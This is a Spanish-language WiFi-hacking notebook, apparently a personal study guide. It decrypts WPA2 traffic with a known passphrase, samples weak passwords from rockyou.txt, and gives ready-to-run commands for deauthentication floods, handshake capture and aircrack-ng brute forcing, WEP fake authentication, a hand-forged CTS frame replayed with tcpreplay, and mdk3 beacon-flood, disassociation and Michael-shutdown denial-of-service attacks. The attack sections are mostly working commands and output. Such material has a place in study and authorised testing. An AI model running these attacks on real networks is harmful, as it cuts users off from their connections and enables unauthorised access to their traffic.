=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-

 -->

<p align="center"> <img src="https://user-images.githubusercontent.com/94720207/228101704-c07ced92-e331-446c-aa7e-5d00018e2429.gif" alt="Encapsula" height=110px/> </a> </p> 

<br>
<br>
<br>

## Desencriptar y MiTM de tráfico 802.11

[airdecap-ng: MITM en el aire y sin dejar huella](https://www.flu-project.com/2012/09/airdecap-ng-mitm-en-el-aire-y-sin-dejar_30.html#:~:text=airdecap%2Dng%20es%20una%20de,sido%20capturado%20mediante%20airodump%2Dng.)

Los frames 802.11 van encriptados en el aire, no es como en ethernet como ya se ha visto en CWNA. Por ejemplo, en 802.3 podría sniffear y ver en clartext sin problemas tráfico HTTP o Telnet, pero en WiFi, incluso ese tráfico irá encriptado. Para ver este tráfico y lograr desencriptarlo se pueden utilizar algunas técnicas divertidas. 

Nota: El concepto de "MiTM" aquí no es tan representativo como por ejemplo en Ethernet, aquí uno no se pone "enmedio" del tráfico y lo deja pasar como ya he puesto en writeups como atacando a infra Cisco, en 802.11 en realidad se "escucha el aire" que es algo diferente... pero al final de cuentas, si podría considerarse un tipo de MiTM ya que estamos escuchando "el todo" (sin la necesidad física de ponerse enmedio... hasta parece filosofía, pero el concepto se entiende lol)

- Importante: **Lo que hace que esos frames estén encriptados no es más ni menos que la PSK (password) que se proporciona para entrar a la red, es lo único que se necesita para desencriptar el tráfico**
- Importante2: **El tráfico sin contraseñas como una red WiFi `Open` viajará el tráfico sin encriptar, en este caso, se podría ver el tráfico sin problemas ya que por default wireshark trae la opción de `802.11 decrypt`, o se puede activar manualmente.** 

---

### Desencritpar tráfico con `wireshark`

- [How To Decrypt WPA2 with Wireshark](https://www.youtube.com/watch?v=RnfXiAYqsuc)

1. Una vez teniendo la PSK, por ejemplo: `godzilla2000` ir a:

    - `edit` > `preferences` > `protocols` > `IEEE 802.11` > `Decryption Keys` > `Edit`

2. En la ventana WEP & WPA Decryption Keys agrego con "+" una nueva: `wpa-pwd` + `godzilla2000`    

    - OJO!!! revisar que el checkbox de arriba `enable decryption` esté prendido

3. Listo!!! Todos los frames que pertenecen a ese SSID podrán ser vistos en plain text, o mejor dicho, como se verían en 802.3 Ethernet ya que por ejemplo un HTTPS seguirá encritpado por el SSL que traía su encapsulamiento anterior. 

**Filtrar tráfic0 802.11 Desecriptado:**

````java
wlan.fc.protected == 0
````

**Filtrar tráfic0 802.11 Desecriptado:**

````java
wlan.fc.protected == 1
````

---

### Desencriptar tráfico con `airdecap`

````sh

# Este proceso es bastante sencillo, solo es necesario el PSK que previamente ya fue obtenido via OSINT, cracking, exploting, etc...

# 1. Lanzar el comando y especificar el archivo .pcap o .cap capturado anteriormente:

# Opción .cap
airdecap-ng -e 'Fz3r0_Air_PWN' -p godzilla2000 Fz3r0_WiFi_Log-01.cap

# Opción .pcap
airdecap-ng -e 'Fz3r0_Air_PWN' -p godzilla2000 Fz3r0_4-way-handshake_2-STAs.pcap

    ## Resultado:

    ## Total number of stations seen           26
    ## Total number of packets read         11369
    ## Total number of WEP data packets         0
    ## Total number of WPA data packets      3390
    ## Number of plaintext data packets         0
    ## Number of decrypted WEP  packets         0
    ## Number of corrupted WEP  packets         0
    ## Number of decrypted WPA  packets        26  <<<---- 802.11 WPA Frames desencriptados ;)
    ## Number of bad TKIP (WPA) packets         0
    ## Number of bad CCMP (WPA) packets         0

# 2. Se genera automáticamente un archivo .cap/.pcap adicional que pueda ser leído con la herramienta de preferencia, eliminará los frames que no fueron desencriptados:

    # Ej. "Fz3r0_4-way-handshake_2-STAs-dec.pcap" (notar el final "-dec.pcap") 

````

---

<!-- 

FIN DE CAPITULO :D

=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-

 -->

<p align="center"> <img src="https://user-images.githubusercontent.com/94720207/228101704-c07ced92-e331-446c-aa7e-5d00018e2429.gif" alt="Encapsula" height=110px/> </a> </p> 

<br>
<br>
<br>

















## Seleccion de antenas usb

https://miloserdov.org/?p=2196

awus 1900

https://miloserdov.org/?p=5493













## Fz3r0 - Air PWN!!!

foro wifi hakcing https://underc0de.org/foro/wireless/airolib-ng-(el-'rapido'-crackeo-de-wpawpa2)/
podcast wifi hacking basics https://www.youtube.com/watch?v=1x31YZ7DVCM


## Fz3r0 Lord One-Liners

- Hacer siempre todo en **root**: `sudo su`
- Realizado para interfaces con sintaxis `wlan(x)` & `wlan(x)mon`, ejemplo: `wlan0` & `wlan0mon`
- Compatible con `Linux` basado en `Debian`, ejemplo: `Kali Linux` & `Parrot Sec`






























# CANTO IV: Contraseñas PSK inseguras & vulnerables

Las contraseñas PSK (Pre-Shared Key) son contraseñas compartidas que se utilizan para cifrar el tráfico de red en las redes WiFi que utilizan el protocolo WPA o WPA2. Una contraseña PSK insegura y vulnerable es aquella que es fácil de adivinar o de crackear mediante herramientas automatizadas, como diccionarios o wordlists. Por esta razón, es importante crear contraseñas PSK fuertes y seguras, que contengan una combinación de caracteres, números, símbolos y letras mayúsculas y minúsculas, para que sean más difíciles de adivinar o crackear.

Las wordlists son listas de palabras, nombres y combinaciones de caracteres que se utilizan para realizar ataques de fuerza bruta o diccionario en contraseñas. Algunas de estas wordlists son públicas y se pueden descargar de sitios web o de bases de datos filtradas, como la base de datos RockYou que fue filtrada en 2009 y contenía más de 32 millones de contraseñas.

Existen herramientas automatizadas, como Crunch o Cewl, que permiten crear wordlists personalizadas a partir de patrones y reglas específicas, como la combinación de palabras, números y símbolos, o la inclusión de palabras de un idioma determinado.

**Las contraseñas de redes WiFi se pueden vulnerar si son débiles o vulnerables a ataques de fuerza bruta, diccionario, rainbow table, database, etc.** 

- Las redes WEP son las más vulnerables, ya que este tipo de cifrado se puede vulnerar fácilmente con herramientas automatizadas. 
- Las redes WPA y WPA2 también pueden ser vulnerables si se utilizan contraseñas débiles o si el atacante tiene acceso a las bases de datos de contraseñas filtradas. 
- Las redes WPA3 y 802.1X son más seguras, ya que utilizan métodos de autenticación más avanzados, pero también pueden ser vulnerables si se utilizan contraseñas débiles o si el atacante tiene acceso a los servidores de autenticación. 

**Es importante utilizar contraseñas fuertes y seguras y mantener siempre actualizado el firmware y la seguridad de la red WiFi.**

## Fz3r0 Cyber-Weapons: Stupid Password Generator v1.0

Este programa es un script de bash que genera una lista de cinco contraseñas "estúpidas" y vulnerables para ser utilizadas en pruebas de seguridad. El objetivo es crear contraseñas débiles que puedan ser fácilmente adivinadas por un atacante que intente un ataque de fuerza bruta.

Por default, las contraseñas se generan a partir de las primeras 10,000 líneas del archivo de texto "rockyou.txt". La lista RockYou.txt es una de las wordlists más populares y utilizadas en el mundo de la ciberseguridad. Contiene más de 32 millones de contraseñas en texto plano, que fueron filtradas en 2009 después de que un hacker lograra acceder a la base de datos de la empresa RockYou, que ofrecía servicios de juegos y aplicaciones en línea.

- El script selecciona las contraseñas que tienen **10 o más caracteres** y las muestra en la consola. _(Ya que las contraseñas WPA2 solicitan un mínimo de 10 caracteres)_
- Estos valores pueden ser modificados manualmente dentro del script. 

---

### Stupid Password Generator v1.0: `Bash Version`:

````sh
#!/bin/bash

    # Github:   Fz3r0

    # Twitter:  @Fz3r0_OPs

    # Youtube:  @Fz3r0_OPs

counter=0
clear
echo "=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=--=-"
echo ""
echo "              Generador de Passwords Estúpidos v1.0 by Fz3r0"
echo ""
echo "=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=--=-"
echo ""
echo "[+] Este script genera Passwords vulnerables, filtrados, públicos y estúpidos."
echo ""
echo "[+] ¡No utlizar ninguno de estos Passwords en Producción!" 
echo ""
echo "[+] ¡Esta herramienta está hecha para probar ataques de fuerza bruta!"
echo ""
echo "[+] Los Passwords generados tienen 10 o más caracteres (Perfectos para WPA2)"
echo ""
echo "=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=--=-"
echo ""
echo "    5 PASSWORDS ESTÚPIDOS QUE UTILIZA TU TÍO EL BORRACHO SON:"
echo ""
#Obtenemos las primeras 10000 lineas del archivo rockyou.txt
head -10000 /usr/share/wordlists/rockyou.txt | shuf | while read line; do
    # Verificamos si la línea tiene 10 o más caracteres
    if [[ ${#line} -ge 10 ]]; then
        #Imprimimos la linea
        echo $line
        #Incrementamos el contador en 1
        counter=$((counter+1))
        #Verificamos si el contador ha alcanzado 5
        if [[ $counter -eq 5 ]]; then
            #Salimos del ciclo
            break
        fi
    fi
done
````

---

### Stupid Password Generator v1.0: `Python Version`:

````py
#!/usr/bin/env python3

# Github:   Fz3r0
# Twitter: @Fz3r0_OPs
# Youtube: @Fz3r0_OPs

import random

counter = 0
print("=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=--=-")
print("")
print("              Generador de Passwords Estúpidos v1.0 by Fz3r0")
print("")
print("=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=--=-")
print("")
print("[+] Este script genera Passwords vulnerables, filtrados, públicos y estúpidos.")
print("")
print("[+] ¡No utlizar ninguno de estos Passwords en Producción!")
print("")
print("[+] ¡Esta herramienta está hecha para probar ataques de fuerza bruta!")
print("")
print("[+] Los Passwords generados tienen 10 o más caracteres (Perfectos para WPA2)")
print("")
print("=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=--=-")
print("")
print("    5 PASSWORDS ESTÚPIDOS QUE UTILIZA TU TÍO EL BORRACHO SON:")
print("")
# Abrimos el archivo rockyou.txt y obtenemos las primeras 10000 líneas
with open('/usr/share/wordlists/rockyou.txt', 'r', encoding='latin-1') as f:
    lines = f.readlines()[:10000]
    # Iteramos sobre las líneas del archivo
    for line in random.sample(lines, len(lines)):
        # Eliminamos los espacios en blanco al inicio y al final de la línea
        line = line.strip()
        # Verificamos si la línea tiene 10 o más caracteres
        if len(line) >= 10:
            # Imprimimos la línea
            print(line)
            # Incrementamos el contador en 1
            counter += 1
            # Verificamos si el contador ha alcanzado 5
            if counter == 5:
                # Salimos del ciclo
                break

````

---

### Stupid Password Generator: `PoC`

````java
=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=--=-

              Generador de Passwords Estúpidos v1.0 by Fz3r0

=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=--=-

[+] Este script genera Passwords vulnerables, filtrados, públicos y estúpidos.

[+] ¡No utlizar ninguno de estos Passwords en Producción!

[+] ¡Esta herramienta está hecha para probar ataques de fuerza bruta!

[+] Los Passwords generados tienen 10 o más caracteres (Perfectos para WPA2)

=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=--=-

    5 PASSWORDS ESTÚPIDOS QUE UTILIZA TU TÍO EL BORRACHO SON:

iloveyou23
ilovemymum
soccergirl
friends4ever
abcdefghij
````

---

























## Ataques y Vulneración de WLANs - `WPA/WPA2 (PSK)`

### Captura Pasiva de Frames + Explotación de WLAN

- Es posible capturar 802.11 Frames tan solo monitoreando la red por un periodo de tiempo y buscar los eapol con `wireshark` o `airodump`.

    - `Activo` se refiere a ejecutar ciertas funciones maliciosas como `de-authentication attacks` para obtener `4-way-handshake` de manera intrusiva. 
    - `Pastivo` se refiere a no modificar ningún comportamiento en la red LAN o WLAN para obtener los frames deseados, simplemente esperar por el momento para ser capturado, por ejemplo un log-in real de un cliente a la red WLAN.

Actuar de manera pasiva ayuda para que los ataques y las intenciones del atacante no sean descubiertas tán fácilmente, sin embargo, aún existen técnicas como `MAC Spoofing` que permiten ocultar la dirección MAC real del atacante. 

Cualquiera que sea el caso, el final lo importante es obtener el `4-way-handshake` y capturar los frames para al final intentar crackearlos y asó obtener acceso a la red. La red después puede ser mapeada y enumerada y así seguir con el proceso de vulneración y explotación de los clientes internos como clientes, servidores, routers, etc. 

---

### Deauthentication Attack

````sh
   #
   #  DEAUTHENTICATION ATTACK: DIRECTED (Dirigido a un solo objetivo)
   #

# 1. Ventana a) Poner la interface en modo `monitor` y monitorear el aire
# OJO!!! PONERSE EN EL MISMO CANAL DE LA STA VÍCTIMA (Ej, `-c 11`)
airmon-ng check kill && airmon-ng start wlan0 && airodump-ng wlan0mon -c 6 

# 2. `Ventana b)` Lanzar ataque de `Deauthentication` al SSID/BSS (En este caso 10,000 deauth Frames)
# Opcion 1 (SSID)
aireplay-ng --deauth 10000 -e Fz3r0_Air_PWN -c C8:94:02:B9:10:33 wlan0 
# Opcion 2 (BSSID)
aireplay-ng --deauth 10000 -a 30:45:96:D7:F2:3E -c c8:94:02:b9:10:33 wlan0

# 3. En la Ventana a) recibiremos el `WPA handshake: 30:45:96:D7:F2:3E` en la parte superior derecha

   #
   #  DEAUTHENTICATION ATTACK: GLOBAL (Cualquier STA del SSID)
   #

# Opcion 1: Enviar al SSID hacia una MAC broadcast como `FF:FF:FF:FF:FF:FF`
aireplay-ng --deauth 10000 -e Fz3r0_Air_PWN -c FF:FF:FF:FF:FF:FF wlan0mon
# ó al BSSID :
aireplay-ng --deauth 10000 -a 30:45:96:D7:F2:3E -c FF:FF:FF:FF:FF:FF wlan0mon

# Opcion 2: Sin ninguna MAC = Broadcast automático:
aireplay-ng --deauth 10000 -a 30:45:96:D7:F2:3E wlan0mon
````

---

### WPA2 Brute Force: Full Attack

````sh
# Proceso completo de ataque y Brute Force ASAP
# https://esgeeks.com/como-usar-aircrack-ng/

# 1. Monitoreo sencillo para identificar objetivo (kill, monitor on, dump live):
airmon-ng check kill && airmon-ng start wlan0 && airodump-ng wlan0

# 2. Anotar `BSSID` y `Channel` del objetivo, por ejemplo: 

    # BSSID   = 30:45:96:D7:F2:3E
    # Channel = 6
    # EESID   = Fz3r0_Air_PWN

# 3. Ejecutar el dump completamente dirigido al AP target (Channel + BSSID + Write Output)
airodump-ng -c 6 --bssid 30:45:96:D7:F2:3E --write Fz3r0_WiFi_Log wlan0

# 4. (Opcional) Lanzar `Deauthentication Attack` para crear `handshakes` (o esperar a que los clientes haga autenticación real...)

    # -a = Es la dirección MAC de la red WiFi objetivo.
    # -e = Es el ESSID de la red objetivo, es decir, su nombre.
aireplay-ng -0 10 -a 30:45:96:D7:F2:3E -e Fz3r0_Air_PWN wlan0

# 5. Detener el ataque, esperar a que se autentiquen y revisar si llegó algún `handshake` al arhcivo `Fz3r0_WiFi_Log-01.cap`, lanzar comando para desencriptar:
aircrack-ng Fz3r0_WiFi_Log-01.cap -w /usr/share/wordlists/rockyou.txt

# 666. LISTO!!! 

### NOTA: para borrar todos los archivos generados: rm *

   # Ejemplo:

#                               Aircrack-ng 1.6 
#
#      [00:00:01] 6253/10303727 keys tested (8332.39 k/s) 
#
#      Time left: 20 minutes, 35 seconds                          0.06%
#
#                          KEY FOUND! [ password10 ]
#
#
#      Master Key     : FD FB 3C D0 14 FB E7 23 DA 2F 9C 90 1F 3F 5F 4E 
#                       FB 32 E9 46 BD FD 5F 6E F9 06 24 53 CA 76 0C CC 
#
#      Transient Key  : 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
#                       00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
#                       00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
#                       00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
#
#      EAPOL HMAC     : BE CA 45 62 3E DF B5 A3 AC 3D EB 3D DA 7C 94 98 
````

4-way-handshake
https://www.youtube.com/watch?v=vHIRmG_BzQI

---

### False Authentication Attack (WEP)

````sh

## IMPORTANTE: SOLO SIRVE CON AUTENTICACIÓN WEP!!! (NO WPA/WPA2)

# 1. Monitorizar la red (ventana A)

airmon-ng check kill && airmon-ng start wlan0mon && airodump-ng wlan0mon -c 6

# 2. Hacer ataque de fake auth, esperar a que se haga un association (verificar con aumento de frames)

# -1 = Fake Auth
#  0 = De forma ilimitada la inyección de frames
# -e = SSID victima
# -a = BSSID (AP MAC)
# -h = MAC (puede ser spoofed)

aireplay-ng -1 0 -e Fz3r0_Air_PWN -a 30:45:96:D7:F2:3E -h c4:10:8a:f0:f0:f0 wlan0mon
````

---

### CTS Frame Attack

- [Fz3r0 - CTS Frame Attack](https://github.com/Fz3r0/WiFi-CTS-Frame-Attack-802.11-Frame)

````sh

## CTS = Clear To Send (Control Frames) Attack

    ## - Este ataque se basa en el secuestro de Bandwith (DataRate & Throughput) de la WLAN

    ## - El propósito es deautenticar clientes para al final capturar un handshake (similar a un deauth attack)

# INSTRUCCIONES:    

# 1. Monitorizar la red (ventana A + Save audit .cap) 

    # Ojo: no debe ser tan avanzado y auditoado realmente, solo quiero paturar el CTS, pero para tener ya toda la red para atacar desde un inicio :P (mas adelante necesito el BSS para inyectar el frame anyway)

airmon-ng check kill && airmon-ng start wlan0mon && airmon-ng check kill && airmon-ng start wlan0mon && airodump-ng -c 6 --bssid 30:45:96:D7:F2:3E --write Fz3r0_WiFi_Log wlan0

# 2. Ahora hay que crear, farmear o modificar... un Frame CTS con Duration (microsegundos) muy largo

#     - Lo extraigo de Wireshark farmeando cualquier cosa en la red o de una captura vieja 802.11

# Ejemplo: 

    # Escuchar con Wireshark y buscar CTS con:  >>> wlan.fc.type_subtype == 28 <<<

    # El lugar donde esta el duration en 802.11 frame > CTS > Flags > Duration (Hasta abajo) >>> wlan.duration <<<

    # Seleccionar el frame que quiera, y apuntar bien su Duration!!! p.e.: 556 (ss)

    # Wireshark > File > Export Specified packets > "Fz3r0_CTS_556.pcap"   REVISAR BIEN EXPORTAR "ONLY SELECTED" Y "PCAP (NO NEW GEN)"

# - Abrir ghex con el .pcap creado: 

ghex Fz3r0_CTS_808.pcap  

# - La mejor manera de revisar el duration es abrir ese mismo frame con wireshark y darle click y ya!!! tan facil

# - Las 2 veces que revisé era después del par 6 de derecha a izquierda: (00 2c)

###      0000   00 00 12 00 2e 48 00 00 00 30 85 09 c0 00 e1 01   .....H...0......
###      0010   00 00 c4 00 2c 02 24 11 45 37 8d f0               ....,.$.E7..
###                         -- --

# - Se puede comprobar con Python, por ejemplo:

     # 1 - Sacar el valor little-endian (derecha izquierda en pares)

     # 2c 02 = 02 2c

     # 1- Comprobar con python en formato HEX: 0x2c00

# inicio consola python
python3

# En consola python
0x022c

    # Resultado, si fue igual a 556, entonces compruebo ese es el duration en hex

        # >>> 0x022c
        # 556

# 3. Ahora hay que modificar el frame para poner el máximo duration posible de un CTS (30000 ss) 
    
    # Esto va a crear contención artificial ;) 

# inicio consola python
python3

# En consola python
hex(30000)

    # Resultado = 0x7530 

        # >>> hex(30000)
        # '0x7530'

    # Little-Endian (reversa ahora) = 30 75

    # Entonces ahora el HEX quedaría así

###      0000   00 00 12 00 2e 48 00 00 00 30 85 09 c0 00 e1 01   .....H...0......
###      0010   00 00 c4 00 30 75 24 11 45 37 8d f0               ....,.$.E7..
###                         -- --

# En caso de haber cerrado ghex, volverlo a abrir 

ghex Fz3r0_CTS_808.pcap 

# 1. Modificación de Frame (solo dar doble click y modificar los 2 pares [30 75])

###      0000   00 00 12 00 2e 48 00 00 00 30 85 09 c0 00 e1 01   .....H...0......
###      0010   00 00 c4 00 30 75 24 11 45 37 8d f0               ....,.$.E7..
###                         -- --  

# 2. Modificar la MAC del BSS (AP) que quiero atacar 30:45:96:D7:F2:3E (si el primer frame se capturo de esa MAC entonces será la misma)

###      0000   00 00 12 00 2e 48 00 00 00 30 85 09 c0 00 e1 01   .....H...0......
###      0010   00 00 c4 00 30 75 30 45 96 D7 F2 3E               ....,.$.E7..
###                               -- -- -- -- -- -- 

# 3. Guardar el archivo como un nuevo .pcap (este puede servir en un futuro, solo se necesita cambiar el BSS ;))

    # Save As: Fz3r0_CTS_808_30000duration_attack.pcap

# 4. Validar con wireshark el frame y su duración

wireshark Fz3r0_CTS_808_30000duration_attack.pcap 

    # En mi caso ahora el duration y Receiver Address dice: 

    # Duration:          30000

    # Receiver Address:  30:45:96:D7:F2:3E

    # FCS: Ese puede que marque error pero el frame será válido (recordar que algunas interfaces no capturan FCS como la Panda)

# 2. Inyectar el Frame CTS modificado con TCP Replay  

    # -- topspeed (que lo haga al maximo de velocidad)

    # -- loop (cantidad de frames a enviar)

tcpreplay --intf1=wlan0mon --topspeed --loop=2000 Fz3r0_CTS_808_30000duration_attack.pcap 2>/dev/null

# Se puede validar con <<< wlan.duration == 30000 >>> y se verán los paquetes boom!!!

    # En este punto se pudieron haber ya deautenticado dispositivos en el BSS atacado
````

### Crear CTS con Scappy

````py

# aun no he logrado modificar el duration, pero esto lanza un CTS real ;) 

from scapy.all import *

type_field = 12
subtype_field = 12
FCfield_field = 0
ID_field = 0
addr1_field = "00:11:22:33:44:55"
addr2_field = "aa:bb:cc:dd:ee:ff"
addr3_field = "ff:ee:dd:cc:bb:aa"
SC_field = 0

pkt = RadioTap() / Dot11(type=type_field, subtype=subtype_field, FCfield=FCfield_field, ID=ID_field, addr1=addr1_field, addr2=addr2_field, addr3=addr3_field, SC=SC_field)

print(pkt.summary())

# Enviar el paquete creado
sendp(pkt, iface="wlan0mon", count=1)
````

---

### Beacon Flood Mode

````sh

    # Inunda el aire de Beacon Frames, estos frames puedes ser creados o generados de manera aleatoria

    # La idea es anunciar información del BSS víctima de manera Spoofing, así sus clientes se comportarán de manera errante

    # Esto generara de-autenticaciones

# OPCION 1: Crear mis BSS/BSSID Spoofeados

## 1. Creo un bash script para crear una lista de BSS's

    # Ejemplo: Este es un script simple de bash que usa un bucle for para imprimir números del 1 al 10. (ojo, se puede hacer one-liner)

for i in $(seq 1 10 ); do
  echo $i
done

    # Con esta idea se puede crear la lista que quiera, como BSSIDs. (Aquí lo hice one-liner)

for i in $(seq 1 10 ); do echo "Fz3r0_Flood_BSSID_$i"; done

    # Ahora, la misma idea pero exportando a texto:

for i in $(seq 1 10 ); do echo "Fz3r0_Flood_BSSID_$i" >> "Fz3r0_BSSIDs_List.txt"; done

## 2. Ahora hago el Beacon Flood Mode con el mdk3

    # b  - beacon flood mode
    # -f - file
    # -s - samples (ej 1000)
    # -c - channel WiFi

mdk3 wlan0mon b -f Fz3r0_BSSIDs_List.txt -s 1000 -c 6 

    # OJO! es mejor hacer una lista aun mas grande que subir los -s

# OPCION 2: BSSIDs random creador directamente por mdk3

    # Esta opción es muy sencilla y permita a mdk3 crear BSSIDs aleatorios e infinitos:

mdk3 wlan0mon b -c 6    

    # O Floodeando con todo la red: 

mdk3 wlan0mon b -c 6 -s 100000
````

---

### Disassiciation Amok Mode

````sh

## Este ataque es un tipo de dissasociation attack

    # - Una ventaja que tiene, si así fuera necesario... Es que permite crear whitelist o blacklists de clientes

    # - Es decir, en una blacklist puedo poder las MAC de los clientes que quiero de-autenticar de un SSID o BSSID
    # - En una whitelist por otro lado, puedo poner clientes que no quiero de-autenticar

# 1. Monitorear la red para ver la lista de MAC de clientes y a que SSID están asociados

airmon-ng check kill && airmon-ng start wlan0mon && airodump-ng wlan0mon -c 6

# 2. Seleccionar las MAC de los clientes para la blacklist o la whitelist, y generar un .txt. Ejemplo: 

    # 24:11:45:37:8D:F0 & 10:3F:44:5C:BC:D7

    # Crear el .txt "blacklist_amok_mode.txt"    

# 3. Lanzar ataque

    # d  - Disassiciation Amok Mode
    # -w - wordlist
    # -c - channel WiFi

mdk3 wlan0mon d -w blacklist_amok_mode.txt -c 6
````

---

### Michael Shutdown Exploitation

````sh

## Este es un ataque muy intrusivo que busca apagar el AP de manera remota usando TKIP 

## OJO!!! Hoy en día casi todos los WiFi utilizan WPA2 con AES, el TKIP es prácticamente obsoleto y será difícil encontrar esta vulnerabilidad. 

    # - De esta manera al volver a encender el AP los clientes se deberán autenticar de nuevo 

    # - La finalidad es capturar rl 4-way-handshake

# 1. Monitorear la WLAN para extraer el BSSID (AP MAC) que atacaré

airmon-ng check kill && airmon-ng start wlan0mon && airodump-ng wlan0mon

# 2. Agregar el BSSID seleccionado en el comando de ataque de mdk3 y lanzar ataque

    # m  - Michael Shutdown 
    # -t - BSSID (AP MAC)
    # -c - channel WiFi

mdk3 wlan0mon m -t 30:45:96:D7:F2:3E
````

---

### Authentication DoS Mode

- [How To: Perform a DoS Attack (MDK3)](https://www.youtube.com/watch?v=383m9nGywnw)

## Pyrit

- [Pyrit](https://github.com/JPaulMora/Pyrit)

### Instrucciones

- Debido a que Pyrit usa python2 y ya es bastante legacy, suele dar errores en Parrot, Kali, Arch, etc...
- El autor promete hacer un nuevo release para python3, pero who knows?

Pasos para instalarlo y hacerlo funcionar: 

- [Pyrit on Kali 2022 Updated](https://www.youtube.com/watch?v=TyDhyLdxG1w)

````sh
# Antes de:

    # - Tener instalado y funcionando Python2

# Instalar dependencias libpcap-dev : 

    # sudo apt-get install libpcap-dev
    # sudo apt-get install python2.7-dev libssl-dev zlib1g-dev libpcap-dev

# En caso de cualquier error adicional, solo googlear el error y cruzar los dedos :P

# 1. Crear y entrar al directorio donde pondré pyrit
cd /home/fz3r0/Documents/00_-_Fz3r0_WiFi_Hacking

# 2. Clonar el repo
git clone https://github.com/JPaulMora/Pyrit

# 3. Entrar al directorio
cd Pyrit

# 4. Ejecutar el setup de pyrit en modo clean
python2 setup.py clean

# 5. Ejecutar el build del programa
python2 setup.py build

# 6. Ejecutar el install de pyrit
python2 setup.py install

  ## OJO!!! Aquí al ejecutar pyrit mostrará un error:

  ## 




````




## Xerosploit

- [Man in the Middle con Xerosploit](https://sospedia.net/man-in-the-middle-con-xerosploit/#:~:text=La%20herramienta%20Xerosploit%20es%20un,de%20nuestro%20equipo%20al%20router.)





















## 802.11 Wireless WPA/WPA2 PSK Cracking

La mayoría de herramientas de hoy en día pueden lograr crackear el PSK sin necesidad de extraer el hccap, sin embargo, esto se puede usar para tener accesible lo equivalente al `hash` (aunque no es lo mismo), el cual pudiera usar para crackear el password con `john` o `hashcat`, pero también hay otras maneras que revisaré. 

